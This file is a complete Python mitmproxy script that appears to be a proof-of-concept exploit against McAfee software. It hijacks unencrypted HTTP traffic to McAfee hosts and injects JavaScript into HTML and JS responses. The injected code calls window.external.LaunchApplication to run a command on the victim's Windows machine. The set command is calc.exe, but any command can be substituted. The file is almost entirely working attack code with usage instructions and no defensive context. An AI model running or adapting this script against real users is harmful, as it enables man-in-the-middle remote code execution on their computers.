#!/usr/bin/env python3
#
# HTTP proxy mode:
#  mitmproxy -s mcsploit_inline.py --ignore '.*' 
#
# Transparent proxy mode: 
#   mitmproxy -s mcsploit_inline.py -T
#

from mitmproxy import ctx, http
import requests
import time

COMMAND="c:\\\\windows\\\\system32\\\\calc.exe"
CMDARGS=""

def response(flow):
    if flow.request.scheme == "http" and (flow.request.headers['host'].endswith("mcafee.com") or "mcafee" in flow.request.url):
        if flow.response.status_code == 302:
            ctx.log("[+] [MCSPLOIT] Insecure McAfee request found! (HTML)")
            https_url=flow.request.url.replace("http://","https://")
            r=requests.get(https_url,headers=flow.request.headers,verify=False)
            if "text/html" not in r.headers['content-type']: return
            contents=r.text 
            contents=contents.replace("</head>","<script>try{window.external.LaunchApplication(\"%s\",\"%s\");}catch(launchapperr){var x;}</script></head>" % (COMMAND, CMDARGS))
            flow.response = http.HTTPResponse.make(200,bytes(contents,encoding="utf-8"),{"Content-Type": "text/html; charset=utf-8","Expires":"-1"})
            return
        try:
            if flow.response.headers["content-type"] == "text/javascript":
                ctx.log("[+] [MCSPLOIT] Insecure McAfee request found! (JS)")
                inject="try{window.external.LaunchApplication(\"%s\",\"%s\");}catch(launchapperr){var x;}\n" % (COMMAND, CMDARGS)
                try:
                    flow.response.contents = inject + flow.response.contents
                except AttributeError:
                    ctx.log("[-] [MCSPLOIT] No content in the original response!")
                    pass
        except KeyError:
            pass